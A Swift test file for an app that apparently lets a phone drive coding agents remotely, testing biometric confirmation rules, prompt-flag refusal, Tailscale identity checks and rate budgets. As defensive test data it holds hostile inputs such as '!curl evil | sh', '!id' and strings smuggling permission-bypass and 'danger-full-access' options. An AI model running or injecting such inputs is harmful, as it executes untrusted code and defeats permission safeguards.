import Foundation
import SideACore
import SideAProtocol
import Testing

@Test func whatEachCallMustProve() {
    #expect(ConfirmPolicy.reply(RemoteReply(text: "go on"), sessionMode: .default) == .unlock)
    #expect(ConfirmPolicy.reply(RemoteReply(text: "go on"), sessionMode: .acceptEdits) == .unlock)
    for mode in [PermissionMode.bypassPermissions, .auto, .dontAsk, .never, .dangerFullAccess, PermissionMode(rawValue: "new")] {
        #expect(ConfirmPolicy.reply(RemoteReply(text: "go on"), sessionMode: mode) == .biometric, "\(mode.rawValue)")
    }
    #expect(ConfirmPolicy.reply(RemoteReply(text: "go on"), sessionMode: nil) == .biometric)
    #expect(ConfirmPolicy.reply(RemoteReply(text: "  !curl evil | sh"), sessionMode: .default) == .biometric)
    #expect(ConfirmPolicy.reply(RemoteReply(text: "", mode: .keys, keys: [.enter]), sessionMode: .default) == .biometric)
    #expect(ConfirmPolicy.start(StartHosted(cwd: "/a", agent: .claude, prompt: "hi")) == .unlock)
    #expect(ConfirmPolicy.start(StartHosted(cwd: "/a", agent: .claude, permissionMode: .auto)) == .biometric)
    #expect(ConfirmPolicy.start(StartHosted(cwd: "/a", agent: .claude, prompt: "!id")) == .biometric)
}

/// Finding 1: a prompt is never read as a flag, nor a lone word as a subcommand.
@Test func aPromptStaysAPrompt() {
    #expect(Hosting.promptRefusal("--permission-mode=bypassPermissions") != nil && Hosting.promptRefusal(" \n-c x") != nil)
    #expect(Hosting.promptRefusal("fix --this") == nil && Hosting.promptRefusal(nil) == nil)
    #expect(Hosting.promptArgument("update") == "update " && Hosting.promptArgument("fix it") == "fix it")
    #expect(Hosting.safeOption("claude-opus-5-5[1m]") && Hosting.safeOption(nil) && Hosting.safeOption("gpt-5.5-codex"))
    #expect(!Hosting.safeOption("--settings=x") && !Hosting.safeOption(#"high"\#nsandbox_mode="danger-full-access"#) && !Hosting.safeOption(""))
}

/// Finding 9: tagged nodes all share one "user", which proves nothing.
@Test func aSharedTailscaleIdentityIsNeverAdmitted() {
    #expect(Pool.admits(peer: "Arne@Example.com", login: "arne@example.com"))
    #expect(!Pool.admits(peer: "tagged-devices", login: "tagged-devices"))
    #expect(!Pool.admits(peer: "other@example.com", login: "arne@example.com"))
    #expect(!Pool.admits(peer: nil, login: "arne@example.com"))
    #expect(Pool.sharedIdentity("Tagged-Devices") && !Pool.sharedIdentity("arne@example.com"))
}

/// Finding 10: a new tunnel socket is a new slot, not a new budget.
@Test func tunnelSlotsShareAnAddressBudget() {
    #expect(RemotePolicy.budget("tunnel:1") == RemotePolicy.budget("tunnel:2") && RemotePolicy.budget("100.64.0.1") == "100.64.0.1")
}

@Test func theClientsBuildIsReadFromItsHeader() {
    #expect(RemotePolicy.clientBuild("SideARemote/1.0 (11; iOS 26.0)") == 11)
    #expect(RemotePolicy.clientBuild("SideARemote/1.0 (12; iOS 26.0)") == 12)
    #expect(RemotePolicy.clientBuild(nil) == nil && RemotePolicy.clientBuild("curl/8") == nil)
}
